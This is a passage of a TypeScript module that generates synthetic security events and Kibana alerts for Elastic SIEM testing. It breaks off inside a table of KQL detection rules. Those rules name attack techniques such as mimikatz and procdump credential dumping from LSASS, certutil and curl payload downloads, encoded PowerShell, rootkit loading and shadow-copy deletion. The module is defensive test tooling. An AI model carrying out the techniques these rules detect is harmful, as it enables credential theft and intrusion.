import { esRequest } from "./client.js";

const TAG = "elastic-security-sample-data";

function getCrowdstrikeHost() {
  return {
    name: process.env.CROWDSTRIKE_HOST_NAME || "LAPTOP-FIN03",
    hostname: process.env.CROWDSTRIKE_HOST_NAME || "LAPTOP-FIN03",
    id: process.env.CROWDSTRIKE_HOST_ID || undefined,
    os: { name: "Windows 11", platform: "windows", type: "windows" },
  };
}

const SCENARIOS = {
  "windows-credential-theft": generateWindowsCredentialTheft,
  "aws-privilege-escalation": generateAwsPrivilegeEscalation,
  "okta-identity-takeover": generateOktaIdentityTakeover,
  "ransomware-kill-chain": generateRansomwareKillChain,
  "linux-persistence": generateLinuxPersistence,
  "network-ids-threats": generateNetworkIdsThreats,
  "entra-id-compromise": generateEntraIdCompromise,
  "gworkspace-exfiltration": generateGWorkspaceExfiltration,
  "crowdstrike-edr-attack": generateCrowdstrikeEdrAttack,
  "cdr-cross-domain": generateCdrCrossDomain,
  "mac-endpoint-activity": generateMacEndpointActivity,
  "gcp-cloud-audit": generateGcpCloudAudit,
  "cloudflare-waf-threats": generateCloudflareWafThreats,
  "github-audit-events": generateGithubAuditEvents,
  "docker-container-events": generateDockerContainerEvents,
  "kubernetes-audit": generateKubernetesAudit,
  "messy-custom-log": generateMessyCustomLog,
};

export type ScenarioName = keyof typeof SCENARIOS;
export const SCENARIO_NAMES = Object.keys(SCENARIOS) as ScenarioName[];

export async function generateSampleData(options: {
  scenario?: ScenarioName;
  count?: number;
  ruleIdMap?: Record<string, string>;
}): Promise<{ indexed: number; scenario: string; indices: string[] }> {
  const { scenario, count = 50, ruleIdMap } = options;
  if (ruleIdMap) setRuleIdMap(ruleIdMap);

  if (scenario && SCENARIOS[scenario]) {
    const events = SCENARIOS[scenario](count);
    const result = await bulkIndex(events);
    return {
      indexed: result.indexed,
      scenario,
      indices: [...new Set(events.map((e) => e._index))],
    };
  }

  const allEvents: IndexedDoc[] = [];
  for (const gen of Object.values(SCENARIOS)) {
    allEvents.push(...gen(Math.ceil(count / Object.keys(SCENARIOS).length)));
  }
  const result = await bulkIndex(allEvents);
  return {
    indexed: result.indexed,
    scenario: "all",
    indices: [...new Set(allEvents.map((e) => e._index))],
  };
}

export async function cleanupSampleData(): Promise<{ deleted: number }> {
  const indices = [
    "logs-endpoint.events.process-default",
    "logs-endpoint.events.network-default",
    "logs-endpoint.events.file-default",
    "logs-endpoint.alerts-default",
    "logs-system.auth-default",
    "logs-aws.cloudtrail-default",
    "logs-okta.system-default",
    "logs-auditd.log-default",
    "logs-suricata.eve-default",
    "logs-azure.signinlogs-default",
    "logs-azure.auditlogs-default",
    "logs-google_workspace.login-default",
    "logs-google_workspace.admin-default",
    "logs-google_workspace.drive-default",
    "logs-crowdstrike.fdr-default",
    "logs-unifiedlogs.log-default",
    "logs-gcp.audit-default",
    "logs-cloudflare.logpush-default",
    "logs-github.audit-default",
    "logs-docker.events-default",
    "logs-kubernetes.audit-default",
    "logs-custom.messy-default",
    ".alerts-security.alerts-default",
  ];

  let totalDeleted = 0;
  for (const index of indices) {
    try {
      const result = await esRequest<{ deleted: number }>(`/${index}/_delete_by_query`, {
        body: { query: { term: { "tags": TAG } } },
      });
      totalDeleted += result.deleted || 0;
    } catch {
      // index may not exist
    }
  }
  return { deleted: totalDeleted };
}

export async function checkExistingData(): Promise<{ totalDocs: number; totalAlerts: number; existingRules: number; byScenario: Record<string, { events: number; alerts: number }> }> {
  const scenarioIndices: Record<string, string[]> = {
    "windows-credential-theft": ["logs-endpoint.events.process-default", "logs-endpoint.events.network-default"],
    "ransomware-kill-chain": ["logs-endpoint.events.process-default", "logs-endpoint.events.network-default", "logs-endpoint.events.file-default"],
    "linux-persistence": ["logs-auditd.log-default"],
    "network-ids-threats": ["logs-suricata.eve-default"],
    "aws-privilege-escalation": ["logs-aws.cloudtrail-default"],
    "okta-identity-takeover": ["logs-okta.system-default"],
    "entra-id-compromise": ["logs-azure.signinlogs-default", "logs-azure.auditlogs-default"],
    "gworkspace-exfiltration": ["logs-google_workspace.login-default", "logs-google_workspace.admin-default", "logs-google_workspace.drive-default"],
    "crowdstrike-edr-attack": ["logs-crowdstrike.fdr-default"],
    "cdr-cross-domain": ["logs-crowdstrike.fdr-default", "logs-okta.system-default"],
    "mac-endpoint-activity": ["logs-unifiedlogs.log-default"],
    "gcp-cloud-audit": ["logs-gcp.audit-default"],
    "cloudflare-waf-threats": ["logs-cloudflare.logpush-default"],
    "github-audit-events": ["logs-github.audit-default"],
    "docker-container-events": ["logs-docker.events-default"],
    "kubernetes-audit": ["logs-kubernetes.audit-default"],
    "messy-custom-log": ["logs-custom.messy-default"],
  };

  let totalDocs = 0;
  let totalAlerts = 0;
  const byScenario: Record<string, { events: number; alerts: number }> = {};

  // Count alerts by rule name to map to scenarios
  try {
    const alertResult = await esRequest<{ hits: { total: { value: number } }; aggregations: { by_rule: { buckets: { key: string; doc_count: number }[] } } }>("/.alerts-security.alerts-*/_search", {
      body: {
        size: 0,
        query: { term: { tags: TAG } },
        aggs: { by_rule: { terms: { field: "kibana.alert.rule.name", size: 100 } } },
      },
    });
    totalAlerts = alertResult.hits.total.value;
  } catch { /* index may not exist */ }

  // Count events per scenario index group
  for (const [scenario, indices] of Object.entries(scenarioIndices)) {
    let events = 0;
    for (const index of indices) {
      try {
        const r = await esRequest<{ count: number }>(`/${index}/_count`, {
          body: { query: { term: { tags: TAG } } },
        });
        events += r.count;
      } catch { /* index may not exist */ }
    }
    if (events > 0 || totalAlerts > 0) {
      byScenario[scenario] = { events, alerts: 0 };
      totalDocs += events;
    }
  }

  // Simple heuristic: if alerts exist, distribute them to scenarios that have events
  const scenariosWithEvents = Object.keys(byScenario).filter((s) => byScenario[s].events > 0);
  if (totalAlerts > 0 && scenariosWithEvents.length > 0) {
    const perScenario = Math.ceil(totalAlerts / scenariosWithEvents.length);
    for (const s of scenariosWithEvents) {
      byScenario[s].alerts = perScenario;
    }
  }

  let existingRules = 0;
  try {
    const found = await findRules({ filter: `alert.attributes.tags:"${TAG}"`, perPage: 1 });
    existingRules = found.total;
  } catch { /* ignore */ }

  return { totalDocs: totalDocs + totalAlerts, totalAlerts, existingRules, byScenario };
}

interface IndexedDoc {
  _index: string;
  _source: Record<string, unknown>;
}

const BULK_CHUNK_SIZE = 200;

async function bulkIndex(docs: IndexedDoc[]): Promise<{ indexed: number }> {
  if (docs.length === 0) return { indexed: 0 };

  let totalIndexed = 0;
  for (let i = 0; i < docs.length; i += BULK_CHUNK_SIZE) {
    const chunk = docs.slice(i, i + BULK_CHUNK_SIZE);
    const body = chunk.flatMap((doc) => [
      { create: { _index: doc._index } },
      doc._source,
    ]);

    const result = await esRequest<{ items: Array<{ create: { _index: string; status: number; error?: unknown } }>; errors: boolean }>("/_bulk", {
      body: body.map((line) => JSON.stringify(line)).join("\n") + "\n",
    });

    if (result.errors) {
      const succeeded = result.items.filter((item) => item.create.status >= 200 && item.create.status < 300).length;
      const firstError = result.items.find((item) => item.create.error);
      throw new Error(`Bulk indexing had errors: ${succeeded}/${result.items.length} succeeded. First error: ${JSON.stringify(firstError?.create.error)}`);
    }
    totalIndexed += result.items.length;
  }

  return { indexed: totalIndexed };
}

// --- Helpers ---

const AGENT_ID = "sample-agent-" + "a1b2c3d4e5f6";

function baseEvent(timestamp: string): Record<string, unknown> {
  return {
    "@timestamp": timestamp,
    tags: [TAG],
    ecs: { version: "8.11.0" },
    event: { ingested: new Date().toISOString() },
  };
}

function endpointProcessEvent(timestamp: string, proc: {
  entityId: string;
  parentEntityId: string;
  name: string;
  pid: number;
  executable: string;
  args?: string[];
  commandLine?: string;
  parentName?: string;
  parentPid?: number;
  parentExecutable?: string;
}, host: Record<string, unknown>, user: Record<string, unknown>): Record<string, unknown> {
  return {
    ...baseEvent(timestamp),
    agent: { type: "endpoint", id: AGENT_ID },
    event: { action: "start", category: ["process"], type: ["start"], kind: "event", dataset: "endpoint.events.process" },
    host,
    user,
    process: {
      entity_id: proc.entityId,
      name: proc.name,
      pid: proc.pid,
      executable: proc.executable,
      args: proc.args || [proc.executable],
      command_line: proc.commandLine || [proc.executable, ...(proc.args || [])].join(" "),
      parent: {
        entity_id: proc.parentEntityId,
        name: proc.parentName || "explorer.exe",
        pid: proc.parentPid || 1,
        executable: proc.parentExecutable || "",
      },
    },
  };
}

function entityId(prefix: string, index: number): string {
  return `${prefix}-${index.toString(16).padStart(8, "0")}`;
}

interface AlertFields {
  ruleName: string;
  severity: string;
  riskScore: number;
  reason: string;
  threat: unknown[];
  dataset?: string;
  process?: { entityId: string; parentEntityId: string; ancestry?: string[]; name: string; pid: number; executable?: string; parentName?: string; parentPid?: number };
  host?: Record<string, unknown>;
  user?: Record<string, unknown>;
  agentType?: string;
  extra?: Record<string, unknown>;
}

let _ruleIdMap: Record<string, string> = {};

export function setRuleIdMap(map: Record<string, string>) { _ruleIdMap = map; }

function alert(timestamp: string, fields: AlertFields): IndexedDoc {
  const ruleUuid = _ruleIdMap[fields.ruleName] || crypto.randomUUID();
  const agentType = fields.agentType || "endpoint";
  const dataset = fields.dataset || (agentType === "endpoint" ? "endpoint.events.process" : "crowdstrike.fdr");
  const src: Record<string, unknown> = {
    ...baseEvent(timestamp),
    agent: { type: agentType, id: AGENT_ID },
    event: { kind: "signal", dataset },
    "kibana.alert.uuid": crypto.randomUUID(),
    "kibana.alert.status": "active",
    "kibana.alert.workflow_status": "open",
    "kibana.alert.start": timestamp,
    "kibana.alert.last_detected": timestamp,
    "kibana.alert.depth": 1,
    "kibana.alert.severity": fields.severity,
    "kibana.alert.risk_score": fields.riskScore,
    "kibana.alert.reason": fields.reason,
    "kibana.alert.original_time": timestamp,
    "kibana.alert.rule.name": fields.ruleName,
    "kibana.alert.rule.uuid": ruleUuid,
    "kibana.alert.rule.rule_id": ruleUuid,
    "kibana.alert.rule.type": "query",
    "kibana.alert.rule.rule_type_id": "siem.queryRule",
    "kibana.alert.rule.category": "Custom Query Rule",
    "kibana.alert.rule.consumer": "siem",
    "kibana.alert.rule.producer": "siem",
    "kibana.alert.rule.enabled": true,
    "kibana.alert.rule.severity": fields.severity,
    "kibana.alert.rule.risk_score": fields.riskScore,
    "kibana.alert.rule.threat": fields.threat,
    "kibana.alert.rule.tags": [TAG],
    "kibana.alert.original_event.kind": "event",
    "kibana.alert.original_event.category": ["process"],
    "kibana.alert.original_event.action": "start",
    "kibana.alert.original_event.dataset": dataset,
    "kibana.space_ids": ["default"],
    "kibana.version": "8.17.0",
  };

  if (fields.host) src.host = fields.host;
  if (fields.user) src.user = fields.user;

  if (fields.process) {
    const ancestry = fields.process.ancestry || [fields.process.parentEntityId];
    src.process = {
      entity_id: fields.process.entityId,
      name: fields.process.name,
      pid: fields.process.pid,
      executable: fields.process.executable || "",
      Ext: { ancestry },
      parent: {
        entity_id: fields.process.parentEntityId,
        name: fields.process.parentName || "",
        pid: fields.process.parentPid || 1,
      },
    };
  }

  if (fields.extra) Object.assign(src, fields.extra);

  return { _index: ".alerts-security.alerts-default", _source: src };
}

function randomIp(): string {
  return `192.0.2.${Math.floor(Math.random() * 254) + 1}`;
}

function minutesAgo(n: number): string {
  return new Date(Date.now() - n * 60 * 1000).toISOString();
}

function mitre(tacticId: string, tacticName: string, techId: string, techName: string) {
  return {
    framework: "MITRE ATT&CK",
    tactic: { id: tacticId, name: tacticName, reference: `https://attack.mitre.org/tactics/${tacticId}/` },
    technique: [{ id: techId, name: techName, reference: `https://attack.mitre.org/techniques/${techId.replace(".", "/")}/` }],
  };
}

// --- Rule definitions for optional creation ---

export interface ScenarioRuleDef {
  name: string;
  description: string;
  severity: string;
  risk_score: number;
  query: string;
  language: string;
  type?: string;
  index: string[];
  threat: unknown[];
  tags: string[];
  enabled?: boolean;
}

function r(name: string, description: string, severity: string, risk_score: number, query: string, index: string[], threat: unknown[]): ScenarioRuleDef {
  return { name, description, severity, risk_score, query, language: "kuery", index, threat, tags: [TAG] };
}

export const SCENARIO_RULES: Record<string, ScenarioRuleDef[]> = {
  "windows-credential-theft": [
    r("Credential Dumping via Mimikatz", "Detects mimikatz.exe execution", "critical", 95, 'process.name: "mimikatz.exe"', ["logs-endpoint.events.process-*"], [mitre("TA0006", "Credential Access", "T1003", "OS Credential Dumping")]),
    r("LSASS Memory Dump via Procdump", "Detects procdump targeting lsass.exe", "high", 85, 'process.name: "procdump.exe" and process.args: "lsass.exe"', ["logs-endpoint.events.process-*"], [mitre("TA0006", "Credential Access", "T1003.001", "LSASS Memory")]),
    r("NTDS.dit Extraction Attempt", "Detects ntdsutil IFM creation", "critical", 92, 'process.name: "ntdsutil.exe" and process.args: "ifm"', ["logs-endpoint.events.process-*"], [mitre("TA0006", "Credential Access", "T1003.003", "NTDS")]),
    r("SAM Registry Hive Export", "Detects SAM hive export via reg.exe", "high", 78, 'process.name: "reg.exe" and process.args: "HKLM\\SAM"', ["logs-endpoint.events.process-*"], [mitre("TA0006", "Credential Access", "T1003.002", "Security Account Manager")]),
    r("Lateral Movement - SMB to Domain Controller", "Detects SMB connections to DC after credential theft", "high", 80, 'destination.port: 445 and process.name: ("net.exe" or "psexec.exe")', ["logs-endpoint.events.network-*"], [mitre("TA0008", "Lateral Movement", "T1021.002", "SMB/Windows Admin Shares")]),
  ],
  "ransomware-kill-chain": [
    r("Suspicious Macro-Enabled Document Execution", "Detects WINWORD spawning cmd.exe", "medium", 55, 'process.parent.name: "WINWORD.EXE" and process.name: "cmd.exe"', ["logs-endpoint.events.process-*"], [mitre("TA0001", "Initial Access", "T1566.001", "Spearphishing Attachment")]),
    r("Cobalt Strike Beacon - Periodic C2 Communication", "Detects periodic HTTPS beaconing via rundll32", "high", 82, 'process.name: "rundll32.exe" and destination.port: (443 or 8443)', ["logs-endpoint.events.network-*"], [mitre("TA0011", "Command and Control", "T1071.001", "Web Protocols")]),
    r("Enumeration of Domain Admin Group", "Detects domain admin group enumeration", "medium", 47, 'process.name: "net.exe" and process.args: "Domain Admins"', ["logs-endpoint.events.process-*"], [mitre("TA0007", "Discovery", "T1069.002", "Domain Groups")]),
    r("Credential Dumping - LSASS Access on Domain Controller", "Detects LSASS credential extraction on DC", "critical", 95, 'process.name: "mimikatz.exe" and host.name: "SRV-DC*"', ["logs-endpoint.events.process-*"], [mitre("TA0006", "Credential Access", "T1003.001", "LSASS Memory")]),
    r("Ransomware - Mass File Extension Modification", "Detects mass file encryption", "critical", 99, 'file.extension: "locked" and event.action: "modification"', ["logs-endpoint.events.file-*"], [mitre("TA0040", "Impact", "T1486", "Data Encrypted for Impact")]),
    r("Ransomware - Volume Shadow Copy Deletion", "Detects vssadmin deleting shadow copies", "critical", 97, 'process.name: "vssadmin.exe" and process.args: "delete"', ["logs-endpoint.events.process-*"], [mitre("TA0040", "Impact", "T1490", "Inhibit System Recovery")]),
    r("Lateral Movement via PsExec to Multiple Hosts", "Detects PsExec lateral movement", "high", 85, 'process.name: "PsExec.exe"', ["logs-endpoint.events.process-*"], [mitre("TA0008", "Lateral Movement", "T1570", "Lateral Tool Transfer")]),
  ],
  "linux-persistence": [
    r("Suspicious Download via Curl to Hidden File", "Detects curl downloading to /tmp hidden file", "medium", 52, 'process.name: "curl" and process.args: "/tmp/*"', ["logs-auditd.log-*"], [mitre("TA0001", "Initial Access", "T1105", "Ingress Tool Transfer")]),
    r("Crontab Persistence - Root Cron Modified", "Detects root crontab modification", "high", 78, 'process.args: "/var/spool/cron/crontabs/root"', ["logs-auditd.log-*"], [mitre("TA0003", "Persistence", "T1053.003", "Cron")]),
    r("SSH Authorized Keys Modified", "Detects SSH key addition for persistence", "high", 82, 'process.args: "*authorized_keys*"', ["logs-auditd.log-*"], [mitre("TA0003", "Persistence", "T1098.004", "SSH Authorized Keys")]),
    r("Systemd Service Created for Persistence", "Detects suspicious systemd service creation", "high", 75, 'process.name: "systemctl" and process.args: "enable"', ["logs-auditd.log-*"], [mitre("TA0003", "Persistence", "T1543.002", "Systemd Service")]),
    r("Kernel Module Loaded - Potential Rootkit", "Detects suspicious kernel module loading", "critical", 95, 'process.name: "insmod" and process.args: "/tmp/*"', ["logs-auditd.log-*"], [mitre("TA0005", "Defense Evasion", "T1014", "Rootkit")]),
    r("SSHD Config Modified to Allow Root Login", "Detects PermitRootLogin change", "high", 72, 'process.args: "*sshd_config*" and process.args: "*PermitRootLogin*"', ["logs-auditd.log-*"], [mitre("TA0003", "Persistence", "T1021.004", "SSH")]),
  ],
  "network-ids-threats": [
    r("DNS Tunneling - High Volume Subdomain Queries", "Detects DNS data exfiltration via subdomains", "high", 78, 'dns.question.name: *evil-cdn.com', ["logs-suricata.eve-*"], [mitre("TA0010", "Exfiltration", "T1048.001", "Exfiltration Over Symmetric Encrypted Non-C2 Protocol")]),
    r("Suricata IDS - Cobalt Strike Beacon Detected", "Detects Cobalt Strike via IDS signature", "critical", 92, 'suricata.eve.alert.signature: *Cobalt*Strike*', ["logs-suricata.eve-*"], [mitre("TA0011", "Command and Control", "T1071.001", "Web Protocols")]),
    r("Suspicious TLS JA3 Fingerprint - Known C2 Framework", "Detects known C2 JA3 hash", "high", 80, 'tls.client.ja3: "a0e9f5d64349fb13191bc781f81f42e1"', ["logs-suricata.eve-*"], [mitre("TA0011", "Command and Control", "T1573.002", "Asymmetric Cryptography")]),
    r("Network Port Scan Detected", "Detects port scanning activity", "medium", 47, 'event.action: "connection_attempted" and destination.port: (22 or 3389 or 5432 or 9200)', ["logs-suricata.eve-*"], [mitre("TA0043", "Reconnaissance", "T1046", "Network Service Discovery")]),
    r("HTTP C2 Beacon - Periodic POST Requests", "Detects periodic HTTP POST beaconing", "high", 76, 'http.request.method: "POST" and url.path: "/api/beacon"', ["logs-suricata.eve-*"], [mitre("TA0011", "Command and Control", "T1071.001", "Web Protocols")]),
  ],
  "aws-privilege-escalation": [
    r("AWS IAM Access Key Created for Another User", "Detects IAM access key creation", "high", 72, 'event.action: "CreateAccessKey" and cloud.provider: "aws"', ["logs-aws.cloudtrail-*"], [mitre("TA0003", "Persistence", "T1098.001", "Additional Cloud Credentials")]),
    r("AWS IAM Privilege Escalation via Policy Attachment", "Detects admin policy attachment", "critical", 88, 'event.action: "AttachUserPolicy" and cloud.provider: "aws"', ["logs-aws.cloudtrail-*"], [mitre("TA0004", "Privilege Escalation", "T1078.004", "Cloud Accounts")]),
    r("AWS Secrets Manager - Unauthorized Access", "Detects secrets access by escalated role", "high", 82, 'event.action: "GetSecretValue" and cloud.provider: "aws"', ["logs-aws.cloudtrail-*"], [mitre("TA0006", "Credential Access", "T1555", "Credentials from Password Stores")]),
    r("AWS S3 Bulk Data Download", "Detects bulk S3 object downloads", "high", 78, 'event.action: "GetObject" and cloud.provider: "aws"', ["logs-aws.cloudtrail-*"], [mitre("TA0010", "Exfiltration", "T1537", "Transfer Data to Cloud Account")]),
    r("AWS CloudTrail Logging Disabled", "Detects StopLogging for evasion", "critical", 94, 'event.action: "StopLogging" and cloud.provider: "aws"', ["logs-aws.cloudtrail-*"], [mitre("TA0005", "Defense Evasion", "T1562.008", "Disable or Modify Cloud Logs")]),
  ],
  "okta-identity-takeover": [
    r("Okta Login from New Geographic Location", "Detects login from unusual geo", "medium", 47, 'event.action: "user.session.start" and okta.client.geographical_context.country: "RU"', ["logs-okta.system-*"], [mitre("TA0001", "Initial Access", "T1078.004", "Cloud Accounts")]),
    r("Okta MFA Factor Reset After Authentication", "Detects MFA factor deactivation", "high", 75, 'event.action: "user.mfa.factor.deactivate"', ["logs-okta.system-*"], [mitre("TA0006", "Credential Access", "T1556", "Modify Authentication Process")]),
    r("Okta Admin Role Assigned to User", "Detects admin role grant", "critical", 90, 'event.action: "user.account.privilege.grant"', ["logs-okta.system-*"], [mitre("TA0004", "Privilege Escalation", "T1098", "Account Manipulation")]),
    r("Okta API Token Created by New Admin", "Detects API token creation for persistence", "critical", 88, 'event.action: "system.api_token.create"', ["logs-okta.system-*"], [mitre("TA0003", "Persistence", "T1136.003", "Cloud Account")]),
    r("Multiple Okta Accounts Compromised from Same IP", "Detects coordinated multi-account takeover", "critical", 95, 'event.action: "user.mfa.factor.deactivate"', ["logs-okta.system-*"], [mitre("TA0006", "Credential Access", "T1556.006", "Multi-Factor Authentication")]),
  ],
  "entra-id-compromise": [
    r("Impossible Travel - Azure AD Sign-In", "Detects sign-in from impossible geographic distance", "high", 78, 'event.outcome: "success" and azure.signinlogs.properties.risk_level_aggregated: "high"', ["logs-azure.signinlogs-*"], [mitre("TA0001", "Initial Access", "T1078.004", "Cloud Accounts")]),
    r("Azure AD Risky Sign-In - High Risk", "Detects high-risk sign-in with conditional access bypass", "high", 82, 'azure.signinlogs.properties.risk_level_during_signin: "high"', ["logs-azure.signinlogs-*"], [mitre("TA0001", "Initial Access", "T1078.004", "Cloud Accounts")]),
    r("Azure AD Global Administrator Role Assigned", "Detects Global Admin role grant", "critical", 95, 'event.action: "Add member to role"', ["logs-azure.auditlogs-*"], [mitre("TA0004", "Privilege Escalation", "T1098.003", "Additional Cloud Roles")]),
    r("OAuth App Consent Phishing - Excessive Permissions", "Detects malicious OAuth app consent", "critical", 90, 'event.action: "Consent to application" or event.action: "Add OAuth2PermissionGrant"', ["logs-azure.auditlogs-*"], [mitre("TA0001", "Initial Access", "T1566.002", "Spearphishing Link")]),
    r("Azure AD MFA Disabled for User", "Detects MFA requirement removal", "high", 75, 'event.action: "Update user" and azure.auditlogs.properties.category: "RoleManagement"', ["logs-azure.auditlogs-*"], [mitre("TA0005", "Defense Evasion", "T1556.006", "Multi-Factor Authentication")]),
  ],
  "gworkspace-exfiltration": [
    r("Google Workspace - Suspicious Login Without MFA", "Detects suspicious login without MFA challenge", "medium", 55, 'google_workspace.login.is_suspicious: true', ["logs-google_workspace.login-*"], [mitre("TA0001", "Initial Access", "T1078.004", "Cloud Accounts")]),
    r("Google Workspace - Super Admin Granted to External Contractor", "Detects Super Admin privilege grant", "critical", 92, 'event.action: "GRANT_ADMIN_PRIVILEGE"', ["logs-google_workspace.admin-*"], [mitre("TA0004", "Privilege Escalation", "T1098", "Account Manipulation")]),
    r("Google Workspace - External Drive Sharing Enabled Org-Wide", "Detects org-wide external sharing change", "high", 70, 'event.action: "CHANGE_APPLICATION_SETTING" and google_workspace.admin.setting.name: *Sharing*', ["logs-google_workspace.admin-*"], [mitre("TA0005", "Defense Evasion", "T1562.001", "Disable or Modify Tools")]),
    r("Google Workspace - Bulk File Download by External User", "Detects bulk drive downloads", "high", 82, 'event.action: "download" and event.provider: "drive"', ["logs-google_workspace.drive-*"], [mitre("TA0009", "Collection", "T1530", "Data from Cloud Storage")]),
    r("Google Drive - Sensitive Files Shared to Personal Email", "Detects external sharing of docs", "critical", 94, 'event.action: "change_user_access" and google_workspace.drive.visibility: "shared_externally"', ["logs-google_workspace.drive-*"], [mitre("TA0010", "Exfiltration", "T1567.002", "Exfiltration to Cloud Storage")]),
    r("Google Workspace - 2FA Disabled for Finance User", "Detects 2FA disabled for user", "high", 75, 'event.action: "CHANGE_TWO_STEP_VERIFICATION"', ["logs-google_workspace.admin-*"], [mitre("TA0005", "Defense Evasion", "T1556.006", "Multi-Factor Authentication")]),
  ],
  "crowdstrike-edr-attack": [
    r("CrowdStrike - MSHTA Spawned by Browser", "Detects mshta.exe spawned by browser process", "high", 78, 'process.name: "mshta.exe" and process.parent.name: "chrome.exe"', ["logs-crowdstrike.fdr-*"], [mitre("TA0002", "Execution", "T1218.005", "Mshta")]),
    r("CrowdStrike - Encoded PowerShell Execution", "Detects hidden encoded PowerShell", "high", 80, 'process.name: "powershell.exe" and process.args: "-enc"', ["logs-crowdstrike.fdr-*"], [mitre("TA0002", "Execution", "T1059.001", "PowerShell")]),
    r("CrowdStrike - Certutil Used for File Download", "Detects certutil downloading remote files", "high", 75, 'process.name: "certutil.exe" and process.args: "-urlcache"', ["logs-crowdstrike.fdr-*"], [mitre("TA0011", "Command and Control", "T1105", "Ingress Tool Transfer")]),
    r("CrowdStrike - Masqueraded Process Name", "Detects svchost.exe from unusual path", "critical", 92, 'process.name: "svchost.exe" and not process.executable: "C:\\Windows\\System32\\*"', ["logs-crowdstrike.fdr-*"], [mitre("TA0005", "Defense Evasion", "T1036.005", "Match Legitimate Name or Location")]),
    r("CrowdStrike - WMI Remote Process Execution", "Detects WMI used for lateral movement", "high", 82, 'process.name: "wmic.exe" and process.args: "process call create"', ["logs-crowdstrike.fdr-*"], [mitre("TA0008", "Lateral Movement", "T1047", "Windows Management Instrumentation")]),
  ],
  "mac-endpoint-activity": [
    r("macOS - Apple Event Display Dialog (Credential Phishing)", "Detects osascript display dialog via Apple Events — credential phishing", "high", 72, 'apple_event.type_code: "syso,dlog"', ["logs-unifiedlogs.log-*"], [mitre("TA0002", "Execution", "T1059.002", "AppleScript")]),
    r("macOS - TCC Access Denied Then Granted", "Detects TCC access override pattern — privacy bypass", "critical", 90, 'unified_log.subsystem: "com.apple.TCC" and message: *AUTHREQ*', ["logs-unifiedlogs.log-*"], [mitre("TA0005", "Defense Evasion", "T1562.001", "Disable or Modify Tools")]),
    r("macOS - LaunchAgent Autolaunch Registered", "Detects LaunchAgent registration via loginwindow", "high", 78, 'unified_log.subsystem: "com.apple.loginwindow.logging" and message: *performAutolaunch*', ["logs-unifiedlogs.log-*"], [mitre("TA0003", "Persistence", "T1543.001", "Launch Agent")]),
    r("macOS - Apple Event Get Clipboard", "Detects clipboard access via Apple Events — data collection", "high", 80, 'apple_event.type_code: "Jons,gClp"', ["logs-unifiedlogs.log-*"], [mitre("TA0009", "Collection", "T1115", "Clipboard Data")]),
    r("macOS - Volume Mute via Apple Event (Stealer Indicator)", "Detects mute command via Apple Events — known stealer pre-indicator", "critical", 88, 'apple_event.mute: true', ["logs-unifiedlogs.log-*"], [mitre("TA0005", "Defense Evasion", "T1562.001", "Disable or Modify Tools")]),
  ],
  "gcp-cloud-audit": [
    r("GCP - Service Account Key Created", "Detects creation of service account key for persistence", "high", 78, 'event.action: "google.iam.admin.v1.CreateServiceAccountKey"', ["logs-gcp.audit-*"], [mitre("TA0003", "Persistence", "T1098.001", "Additional Cloud Credentials")]),
    r("GCP - IAM Policy Modified to Allow All Users", "Detects over-permissive IAM policy change", "critical", 95, 'event.action: "SetIamPolicy" and gcp.audit.authorization_info.permission: *iam*', ["logs-gcp.audit-*"], [mitre("TA0004", "Privilege Escalation", "T1078.004", "Cloud Accounts")]),
    r("GCP - Firewall Rule Allows Inbound SSH from Any", "Detects firewall opened to 0.0.0.0/0 on port 22", "high", 80, 'event.action: *compute.firewalls.insert*', ["logs-gcp.audit-*"], [mitre("TA0005", "Defense Evasion", "T1562.007", "Disable or Modify Cloud Firewall")]),
    r("GCP - Cloud Logging Sink Deleted", "Detects deletion of audit log sink for evasion", "critical", 92, 'event.action: "google.logging.v2.ConfigServiceV2.DeleteSink"', ["logs-gcp.audit-*"], [mitre("TA0005", "Defense Evasion", "T1562.008", "Disable or Modify Cloud Logs")]),
    r("GCP - Cloud Storage Bucket Made Public", "Detects bucket ACL changed to public", "critical", 88, 'event.action: *storage.setIamPermissions* and gcp.audit.method_name: *storage*', ["logs-gcp.audit-*"], [mitre("TA0010", "Exfiltration", "T1537", "Transfer Data to Cloud Account")]),
  ],
  "cloudflare-waf-threats": [
    r("Cloudflare - SQL Injection Blocked", "Detects SQL injection attempts blocked by WAF", "high", 72, 'cloudflare.rule_id: *sqli* and event.outcome: "blocked"', ["logs-cloudflare.logpush-*"], [mitre("TA0001", "Initial Access", "T1190", "Exploit Public-Facing Application")]),
    r("Cloudflare - Credential Stuffing Attack", "Detects high-volume login attempts from single IP", "high", 78, 'cloudflare.action: "challenge" and url.path: */login*', ["logs-cloudflare.logpush-*"], [mitre("TA0006", "Credential Access", "T1110.004", "Credential Stuffing")]),
    r("Cloudflare - Bot Score Zero Traffic Spike", "Detects definite bot traffic bypassing challenge", "medium", 55, 'cloudflare.bot.score: 0', ["logs-cloudflare.logpush-*"], [mitre("TA0043", "Reconnaissance", "T1595", "Active Scanning")]),
    r("Cloudflare - DDoS Attack Mitigated", "Detects L7 DDoS mitigation events", "high", 80, 'cloudflare.action: "drop" and cloudflare.edge.rate_limit: true', ["logs-cloudflare.logpush-*"], [mitre("TA0040", "Impact", "T1498", "Network Denial of Service")]),
    r("Cloudflare - Path Traversal Attempt", "Detects directory traversal in request URI", "high", 75, 'url.original: *../* and cloudflare.action: "block"', ["logs-cloudflare.logpush-*"], [mitre("TA0001", "Initial Access", "T1190", "Exploit Public-Facing Application")]),
  ],
  "github-audit-events": [
    r("GitHub - Repository Visibility Changed to Public", "Detects private repo made public", "critical", 92, 'event.action: "repo.access" and github.visibility: "public"', ["logs-github.audit-*"], [mitre("TA0010", "Exfiltration", "T1567", "Exfiltration Over Web Service")]),
    r("GitHub - Deploy Key Added to Repository", "Detects deploy key added for persistent repo access", "high", 75, 'event.action: "deploy_key.create"', ["logs-github.audit-*"], [mitre("TA0003", "Persistence", "T1098.001", "Additional Cloud Credentials")]),
    r("GitHub - Organization Member Invited with Admin Role", "Detects admin invite to org", "high", 80, 'event.action: "org.invite_member" and github.permission: "admin"', ["logs-github.audit-*"], [mitre("TA0004", "Privilege Escalation", "T1098.003", "Additional Cloud Roles")]),
    r("GitHub - Secrets Scanning Alert Dismissed", "Detects dismissed secret alert — possible cover-up", "high", 72, 'event.action: "secret_scanning_alert.dismiss"', ["logs-github.audit-*"], [mitre("TA0005", "Defense Evasion", "T1562.001", "Disable or Modify Tools")]),
    r("GitHub - Workflow Dispatch from Fork", "Detects workflow_dispatch triggered from fork — supply chain risk", "high", 78, 'event.action: "workflows.completed" and github.actor_type: "fork"', ["logs-github.audit-*"], [mitre("TA0001", "Initial Access", "T1195.002", "Compromise Software Supply Chain")]),
  ],
